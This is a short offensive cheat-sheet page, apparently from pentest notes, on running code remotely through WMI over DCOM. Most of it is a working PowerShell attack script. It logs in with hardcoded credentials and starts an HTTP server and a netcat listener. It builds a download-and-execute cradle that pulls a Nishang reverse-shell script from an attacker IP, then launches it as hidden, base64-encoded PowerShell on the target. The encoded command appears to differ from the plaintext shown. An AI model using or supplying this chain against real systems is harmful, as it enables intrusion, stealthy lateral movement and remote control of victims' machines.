---
title: "WMI Exec"
---

# WMI Exec

Remote code execution via WMI session with PSCredential. Creates processes on remote hosts without using SMB or WinRM, leveraging the DCOM protocol, which reduces noise in some environments.

```powershell
# Credentials
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# WMI session via DCOM
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.234.72 -Credential $credential -SessionOption $options

# Start HTTP server and listener
# python3 -m http.server 80
# nc -vnlp 443

# Encode the payload
pwsh
$Text = "iex(new-object net.webclient).downloadstring('http://192.168.45.156/nishangol.ps1')"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
exit

# Create a process on the target via WMI
$Command = 'powershell -nop -w hidden -e aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADYANwAuADUANwAuADIAMQA4AC8AdgBhAGMAYQAuAHAAcwAxACcAKQA='
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```
